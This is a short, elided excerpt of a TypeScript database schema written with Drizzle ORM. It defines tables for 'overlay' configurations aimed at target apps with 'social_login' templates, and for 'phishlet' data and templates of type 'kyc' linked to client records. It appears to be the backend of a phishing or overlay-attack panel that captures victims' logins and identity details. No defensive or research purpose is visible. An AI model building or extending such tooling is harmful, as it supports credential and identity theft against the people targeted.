...
export const overlayConfigs = sqliteTable('overlay_configs', {
  ...
  persistent: integer('persistent', { mode: 'boolean' }).default(true),
  targetApps: text('target_apps').default('[]'),
  templateType: text('template_type').default('social_login'),
  createdAt: integer('created_at', { mode: 'timestamp' }).notNull().$defaultFn(() => new Date()),
  updatedAt: integer('updated_at', { mode: 'timestamp' }).notNull().$defaultFn(() => new Date()),
});

export const phishletData = sqliteTable('phishlet_data', {
  id: integer('id').primaryKey({ autoIncrement: true }),
  clientId: text('client_id').notNull().references(() => clients.id, { onDelete: 'cascade' }),
  phishletType: text('phishlet_type').notNull().default('kyc'),
...
export const phishletTemplates = sqliteTable('phishlet_templates', {
  id: integer('id').primaryKey({ autoIncrement: true }),
  name: text('name').notNull(),
  type: text('type').notNull().default('kyc'),
